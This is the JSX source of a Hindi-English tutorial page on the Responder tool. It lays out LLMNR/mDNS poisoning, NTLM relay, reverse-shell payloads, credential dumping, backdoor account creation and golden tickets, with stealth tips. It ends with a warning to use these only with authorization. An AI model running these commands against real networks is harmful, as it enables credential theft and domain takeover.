        <li><strong className="text-white">ARP Monitoring:</strong> ARP spoofing detection tools use करें</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="Practice Lab Setup"
        code={`# तीन VMs चाहिए:

# 1. Domain Controller (Windows Server 2019):
#    - AD DS install करें
#    - DNS Server configure करें
#    - Domain: corp.local

# 2. Domain-Joined Workstation (Windows 10):
#    - Domain join करें
#    - Test user login करें

# 3. Attacker (Kali Linux):
#    - Responder install
#    - Same network पर होना चाहिए

# Attack test:
# Kali से: sudo responder -I eth0 -v
# Windows workstation से: \\fileserver\share
# Hash capture हो जाएगा!

# Practice scenarios:
# - LLMNR poisoning
# - NBT-NS poisoning
# - WPAD exploitation
# - Relay attacks (Responder + ntlmrelayx)`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Responder Usage"
        code={`# Multi-Interface poisoning:
sudo responder -I eth0 -I wlan0 -v

# Custom payloads:
# Responder.conf में custom HTML:
# Serve-Html = On
# HtmlFilename = /path/to/custom.html

# Relay attack setup:
# Terminal 1: Responder (poisoning only):
sudo responder -I eth0 --disable http,smb,ldap

# Terminal 2: ntlmrelayx (relay):
ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe

# IPv6 attack (DHCPv6 + DNS):
sudo responder -I eth0 -D -d corp.local -v

# Fingerprinting + OS detection:
sudo responder -I eth0 -f -v
# Connected clients का OS version show होगा

# Log analysis:
grep "NTLMv2" /usr/share/responder/logs/*.txt
# सभी captured hashes list होंगे`}
      />

      <h2>SMB Relay Attack Detailed</h2>
      <p>
        SMB Relay attack Responder का सबसे powerful attack technique है। इसमें captured NTLM hash को crack नहीं करते, बल्कि directly relay करके target machine पर authenticate करते हैं। यह technique "Pass-the-Hash" category में आती है।
      </p>
      <p>
        SMB Relay attack के लिए SMB signing disabled होना चाहिए target machine पर। अगर SMB signing enabled है, तो relay काम नहीं करेगा। ज़्यादातर Windows workstations पर SMB signing disabled होता है, लेकिन Domain Controllers पर enabled होता है।
      </p>
      <CodeBlock
        title="SMB Relay Attack Setup"
        code={`# Step 1: Target list बनाओ (SMB signing disabled machines):
# CrackMapExec से check करो:
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Step 2: Responder config modify करो:
# /etc/responder/Responder.conf में:
# SMB = Off
# HTTP = Off
# बाकी protocols ON रखो

# Step 3: Responder start करो (poisoning only):
sudo responder -I eth0 -v

# Step 4: दूसरे terminal में ntlmrelayx start करो:
ntlmrelayx.py -tf targets.txt -smb2support

# जब victim file share access करे:
# Responder LLMNR response देता है
# Victim आपके machine से authenticate करता है
# ntlmrelayx hash capture करके relay करता है
# Target machine पर command execute होता है`}
      />
      <CodeBlock
        title="Relay with Command Execution"
        code={`# Relay + reverse shell:
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -e <base64_payload>"

# Relay + SAM dump:
ntlmrelayx.py -tf targets.txt -smb2support --dump-sam

# Relay + LSA dump:
ntlmrelayx.py -tf targets.txt -smb2support --dump-lsa

# Relay + SOCKS proxy (persistent access):
ntlmrelayx.py -tf targets.txt -smb2support -socks
# अब proxychains से relay session use करो:
proxychains smbclient //192.168.1.50/C$ -U Administrator

# Relay + Empire payload:
ntlmrelayx.py -tf targets.txt -smb2support -e empire_launcher.bat

# Relay + Mimikatz:
ntlmrelayx.py -tf targets.txt -smb2support -e mimikatz.exe`}
      />

      <h2>Responder Configuration</h2>
      <p>
        Responder की config file customize करके behavior control कर सकते हो। यह pentest scenario के हिसाब से important है।
      </p>
      <CodeBlock
        title="Responder.conf Configuration"
        code={`# Config file location: /etc/responder/Responder.conf

# [Responder Core]
# BindTo = 0.0.0.0 (सभी interfaces पर listen)
# DNS Server enable/disable:
# DNS = On
# DNSJoker = On (fake DNS responses)

# Poisoning protocols:
# RespondTo = LLMNR,NBT-NS,MDNS (सब enable)
# RespondTo = LLMNR (सिर्फ LLMNR — stealth mode)

# Rogue servers:
# HTTP = On (rogue HTTP server)
# HTTPS = On (rogue HTTPS server)
# SMB = On (rogue SMB server — relay के लिए Off करो)
# LDAP = On (rogue LDAP server)
# MSSQL = On (rogue SQL server)
# FTP = On (rogue FTP server)
# POP3 = On (rogue POP3 server)

# WPAD settings:
# WPAD = On (WPAD proxy)
# Serve-Html = On (custom HTML serve)
# HtmlFilename = /path/to/custom.html

# Output settings:
# DumpHashes = On (captured hashes save)
# LogDir = /usr/share/responder/logs/
# SessionLog = On (session logging)

# Stealth settings:
# RespondTo = LLMNR (सिर्फ LLMNR, बाकी Off)
# SMB = Off (relay mode)
# HTTP = Off (relay mode)`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Responder क्या करता है?', a: 'Responder LLMNR/NBT-NS/MDNS poisoning करके Windows network पर NTLMv1/v2 credential hashes capture करता है। यह internal penetration testing में इस्तेमाल होता है।' },
          { q: 'क्या Responder detect हो सकता है?', a: 'हाँ, network monitoring tools detect कर सकते हैं। LLMNR/NBT-NS traffic anomalies detect होती हैं। लेकिन corporate environments में अक्सर monitoring नहीं होती।' },
          { q: 'Captured hashes crack नहीं हो रहे?', a: 'बड़ी wordlist use करो और rules apply करो। या relay attack करो instead of cracking — hash directly authenticate कर सकता है।' },
          { q: 'क्या Linux/Mac पर काम करता है?', a: 'Responder Python tool है — Linux/Mac पर run होता है। लेकिन target machines Windows होने चाहिए क्योंकि LLMNR/NBT-NS Windows protocols हैं।' },
          { q: 'Responder और ntlmrelayx में क्या फ़र्क है?', a: 'Responder hashes capture करता है (crack करने के लिए)। ntlmrelayx hashes relay करता है (directly authenticate करने के लिए)। दोनों साथ में use होते हैं।' },
          { q: 'Corporate network पर safe है?', a: 'Responder passive mode (Analyze) से network mapping कर सकते हो। लेकिन active poisoning detect हो सकता है — authorization लेकर ही करो।' },
          { q: 'कितना time लगता है hashes capture में?', a: 'Network activity पर depend करता है। Busy network पर minutes में hashes आ सकते हैं। Quiet network पर घंटों लग सकते हैं।' },
          { q: 'Kali Nethunter पर कैसे use करें?', a: 'Terminal open करो: sudo responder -I wlan0 -v। WiFi interface use करो। Root access ज़रूरी है।' },
          { q: 'Responder v3 में क्या नया है?', a: 'IPv6 support, improved fingerprinting, better logging, analyze mode improvements, और DHCPv6 enhancements। Latest version recommend किया जाता है।' },
          { q: 'क्या Responder Windows पर चलता है?', a: 'Responder Python-based है और technically Windows पर चल सकता है, लेकिन recommend नहीं किया जाता। Linux (Kali) से चलाना बेहतर है। Windows पर Inveigh use करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>SMB Relay Attack Setup</h2>
      <p>
        SMB Relay attack Responder का सबसे dangerous combination है। इसमें captured hashes को crack करने की ज़रूरत नहीं — hash directly relay करके target machine पर authenticate कर सकते हो। Responder poisoning करता है और ntlmrelayx hash को relay करता है।
      </p>
      <p>
        SMB Relay attack में important है कि SMB signing disabled हो target machine पर। Domain controllers पर SMB signing default enabled होता है, लेकिन workstations पर often disabled होता है।
      </p>
      <CodeBlock
        title="SMB Relay Attack"
        code={`# Step 1: Targets file बनाओ:
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Step 2: Responder config modify:
sudo responder -I eth0 --disable smb,http

# Step 3: ntlmrelayx start करो (दूसरे terminal):
ntlmrelayx.py -tf targets.txt -smb2support

# Step 4: जब victim authenticate करे:
# [+] SMB signing disabled — relay successful!
# [*] SAM database dumped

# Step 5: Relay + shell access:
ntlmrelayx.py -tf targets.txt -smb2support -i

# Step 6: Relay + command execution:
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Step 7: Relay + payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe`}
      />

      <h2>MDNS Poisoning</h2>
      <p>
        MDNS (Multicast DNS) poisoning modern networks में increasingly important है। macOS और Linux systems mDNS extensively use करते हैं। यह port 5353 (UDP) पर काम करता है और .local domain resolution के लिए use होता है।
      </p>
      <CodeBlock
        title="MDNS Poisoning"
        code={`# MDNS automatically poisoned होता है:
sudo responder -I eth0 -v

# macOS/Linux machines:
# [MDNS] Poisoned answer sent to 192.168.1.50

# MDNS traffic capture:
tcpdump -i eth0 port 5353 -v

# MDNS + LLMNR + NBT-NS combo:
# तीनों protocols एक साथ — maximum coverage

# Config: Responder.conf में MDNS = On`}
      />

      <h2>DHCPv6 DNS Takeover</h2>
      <p>
        DHCPv6 DNS takeover Responder का सबसे advanced attack है। यह IPv6 network का फ़ायदा उठाकर DNS server redirect करता है। Corporate networks में IPv6 often enabled होता है लेकिन properly secured नहीं होता।
      </p>
      <CodeBlock
        title="DHCPv6 Attack"
        code={`# DHCPv6 DNS takeover:
sudo responder -I eth0 -D -d corp.local -v

# यह attack क्या करता है:
# 1. DHCPv6 reply भेजता है victims को
# 2. DNS server को attacker IP set करता है
# 3. सभी DNS queries attacker से resolve होंगे

# WPAD + DHCPv6 combo:
sudo responder -I eth0 -D -w -d corp.local -v

# Verification (victim पर): ipconfig /all
# DNS Server दिखाएगा attacker IP

# यह attack तभी काम करता है जब IPv6 enabled हो`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Responder-based attacks real-world में बहुत common हैं। 2019 में एक US company में attacker ने phishing email से network access पाया और Responder use करके 24 घंटे में domain admin credentials capture कर लिए। LLMNR poisoning से NTLMv2 hashes capture हुए, offline crack करके domain admin password मिल गया।
      </p>
      <p>
        2021 में European financial institution में red team engagement में Responder + ntlmrelayx combination use हुआ। SMB signing disabled workstations को target किया और relay attack से direct shell access पाया। Mimikatz से credential dumping — 4 घंटे में full domain compromise।
      </p>
      <p>
        OSCP exam में Responder-based attacks बहुत common हैं। HackTheBox machines जैसे Responder, Intelligence, और Return में यह attack chain use होता है। TryHackMe के Network Services room में भी cover किया जाता है।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Responder अकेले limited है — other tools के साथ combine करने पर real power मिलती है। BloodHound, CrackMapExec, और Impacket के साथ powerful attack chains बनते हैं।
      </p>
      <CodeBlock
        title="Complete Attack Chain"
        code={`# Step 1: Responder से hashes capture:
sudo responder -I eth0 -v

# Step 2: Hash crack करो:
hashcat -m 5600 hash.txt rockyou.txt -r rules/best64.rule

# Step 3: BloodHound से AD enumerate:
bloodhound-python -u username -p password -d corp.local -dc dc01.corp.local -c All

# Step 4: CrackMapExec lateral movement:
crackmapexec smb 192.168.1.0/24 -u username -p password
crackmapexec smb 192.168.1.0/24 -u username -p password -x "whoami"

# Step 5: SecretsDump:
crackmapexec smb 192.168.1.50 -u Administrator -p password --ntds

# Step 6: Golden Ticket:
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local Administrator`}
      />
      <CodeBlock
        title="Impacket Tools Integration"
        code={`# ntlmrelayx with LDAP:
ntlmrelayx.py -tf targets.txt -ldap --dump-adcs

# ntlmrelayx with Shadow Credentials:
ntlmrelayx.py -tf targets.txt --shadow-credentials

# ntlmrelayx with ESC8 (ADCS):
ntlmrelayx.py -tf targets.txt -http -ip attacker_ip

# smbexec (relay + command execution):
ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker Password123! /add"`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Responder को optimize करने के लिए कई techniques हैं। Large networks पर performance important है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Interface Selection:</strong> सही network interface choose करो — internal interface use करो</li>
        <li><strong className="text-white">Protocol Filtering:</strong> सिर्फ required protocols enable करो --disable flag से</li>
        <li><strong className="text-white">Log Management:</strong> Log rotation setup करो — बड़े networks पर logs quickly grow होते हैं</li>
        <li><strong className="text-white">Fingerprinting:</strong> -f flag से OS fingerprinting enable करो — better targeting</li>
        <li><strong className="text-white">Multi-Interface:</strong> Multiple interfaces पर: -I eth0 -I eth1</li>
        <li><strong className="text-white">Custom Config:</strong> Responder.conf customize करो — सिर्फ needed services enable</li>
      </ul>

      <h2>Reporting and Output Analysis</h2>
      <p>
        Responder की output analyze करना penetration testing report का important part है।
      </p>
      <CodeBlock
        title="Log Analysis"
        code={`# Log location:
ls /usr/share/responder/logs/

# सभी captured hashes:
grep -h "NTLMv2" /usr/share/responder/logs/*.txt > all_hashes.txt

# Unique users:
grep "Username" /usr/share/responder/logs/*.txt | awk '{print $4}' | sort -u

# IP-wise hash count:
grep "Client" /usr/share/responder/logs/*.txt | awk '{print $4}' | sort | uniq -c

# Hash types:
grep -c "NTLMv2-SSP" /usr/share/responder/logs/*.txt

# Cracked passwords:
hashcat -m 5600 all_hashes.txt rockyou.txt --show

# Report template:
echo "=== Responder Attack Report ===" > report.txt
echo "Date: $(date)" >> report.txt
echo "Interface: eth0" >> report.txt
echo "Captured Hashes:" >> report.txt
wc -l all_hashes.txt >> report.txt`}
      />

      <h2>IPv6 Attack Techniques</h2>
      <p>
        IPv6 attacks modern networks में बहुत effective हैं। Organizations IPv4 security पर focus करती हैं लेकिन IPv6 को ignore करती हैं।
      </p>
      <CodeBlock
        title="IPv6 Attack Methods"
        code={`# Method 1: DHCPv6 DNS takeover:
sudo responder -I eth0 -D -d corp.local -v

# Method 2: mitm6 + Responder combo:
# Terminal 1: mitm6 -d corp.local
# Terminal 2: ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh wpad.corp.local

# IPv6 traffic monitoring:
tcpdump -i eth0 ip6 -v

# IPv6 neighbor discovery:
ip -6 neigh show

# Important:
# - IPv6 default enabled है Windows पर
# - Firewalls IPv6 properly filter नहीं करते
# - DNS queries IPv6 prefer करते हैं`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Inveigh</td><td className="py-2 px-3">LLMNR/NBT-NS poisoning (Windows)</td><td className="py-2 px-3">PowerShell/C# based, Windows native</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ntlmrelayx</td><td className="py-2 px-3">NTLM relay attacks</td><td className="py-2 px-3">Hash relay instead of cracking</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mitm6</td><td className="py-2 px-3">IPv6 DNS poisoning</td><td className="py-2 px-3">DHCPv6 based, AD takeover</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Bettercap</td><td className="py-2 px-3">Network MITM framework</td><td className="py-2 px-3">WiFi, ARP, DNS spoofing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Metasploit auxiliary</td><td className="py-2 px-3">LLMNR/NBT-NS capture</td><td className="py-2 px-3">Framework integration</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">nbns_spoofer</td><td className="py-2 px-3">NBT-NS spoofing</td><td className="py-2 px-3">Lightweight, single purpose</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">LLMNR-Responder</td><td className="py-2 px-3">LLMNR poisoning</td><td className="py-2 px-3">Go-based, cross-platform</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Cain & Abel</td><td className="py-2 px-3">Network sniffing/poisoning</td><td className="py-2 px-3">GUI, Windows only, legacy</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Analyze mode (-A) से पहले network map करो — active hosts और servers identify करो</li>
          <li>Responder + ntlmrelayx combination सबसे effective attack chain है</li>
          <li>DHCPv6 mode (-D) corporate networks में ज़्यादा effective है</li>
          <li>Hash crack न हो तो relay attack करो — password crack करने की ज़रूरत नहीं</li>
          <li>LLMNR disable करना सबसे important defense है</li>
          <li>WiFi interface (wlan0) से wireless networks पर भी attack कर सकते हो</li>
          <li>Custom HTML serve करके phishing pages host कर सकते हो</li>
          <li>Responder logs को बाद में analyze करो — patterns मिलेंगे</li>
          <li>Responder.conf में specific protocols enable/disable करो — stealth mode में सिर्फ LLMNR रखो</li>
          <li>Responder + CrackMapExec + BloodHound combo से complete internal pentest हो जाता है</li>
          <li>Corporate environment में weekend या off-hours में चलाओ — ज़्यादा traffic मिलेगी</li>
          <li>Hashcat rules (best64.rule, dive.rule) apply करो cracking speed बढ़ाने के लिए</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Responder एक powerful network poisoning टूल है। इसका इस्तेमाल केवल authorized penetration testing और red team operations में ही करें। बिना अनुमति के LLMNR/NBT-NS poisoning और credential capture illegal है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized network interception अपराध हो सकता है।
      </div>
    </TutorialLayout>
  )
}
